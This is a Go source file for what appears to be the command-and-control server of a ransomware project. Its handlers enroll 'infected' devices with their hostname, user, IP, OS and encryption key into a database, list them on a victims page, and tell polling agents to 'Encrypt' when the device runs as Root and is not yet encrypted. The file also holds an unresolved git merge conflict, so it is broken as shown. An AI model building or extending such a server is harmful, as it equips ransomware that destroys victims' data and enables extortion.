package Webserver

import (
	"encoding/json"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"

	"github.com/fatih/color"
)

type Enumeration struct {
	ID        string `json:"ID"`
	Hostname  string `json:"Hostname"`
	User      string `json:"User"`
	IP        string `json:"IP"`
	Pwd       string `json:"Pwd"`
	OS        string `json:"OS"`
	Encrypted bool
	Key       string
}

var (
	device  Enumeration
	devices []Enumeration
)

//used for querying that webserver is running
func HomeHandler(w http.ResponseWriter, r *http.Request) {
	defaultMessage := []byte("Listening for incoming connections ")
	_, err := w.Write(defaultMessage)
	if err != nil {
		log.Fatal(err)
	}
}

//listening for agents to enroll infected device (RegisterHost())
func InfectedHandler(w http.ResponseWriter, r *http.Request) {

	req, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Fatalf("Issue getting enumeration data from device: %s", err)
	}
	json.Unmarshal([]byte(req), &device)
	log.Printf("Enrolled a new device: %s", device.ID)
	device.Encrypted = false

	dbConnection, err := Connect() //connect to the database
	if err != nil {
		log.Println("Cannot connect to db ", err)
	}
	err = Insert(dbConnection, device)
	if err != nil {
		log.Printf("Issue inserting data into the database for device: %s \nwith error: %s", device.ID, err.Error())
	}

}

//user page to view enrolled devices
func ViewInfected(w http.ResponseWriter, r *http.Request) {
	t, err := template.ParseFiles("./pages/infected.gohtml")
	if err != nil {
		log.Fatalf("Issue with 'infected' html template: %s", err.Error())
	}
	dbConnection, err := Connect() //connect to the database
	if err != nil {
		log.Println("Cannot connect to db ", err)
	}
	devices, err := Query(dbConnection)
	if err != nil {
		log.Println("Cannot query the db ", err)
	}
	t.Execute(w, devices)
}

func CommandHandler(w http.ResponseWriter, r *http.Request) {
	//Reads the header of the request and issue commands
	//Tied to Agent.KeepAlive()

<<<<<<< HEAD
	color.Red("Device %s requesting commands \n", device.ID)
=======
	log.Printf("Device %s requesting commands \n", device.ID)
>>>>>>> origin
	if device.User == "Root" && !device.Encrypted {
		w.WriteHeader(http.StatusOK)
		command := []byte("Encrypt")
		w.Write(command)
		//TODO: update device.Encrypted = true -- Update function
		//err = update(device)

	} else {
		command := []byte("Wait")
		w.Write(command)
	}
}
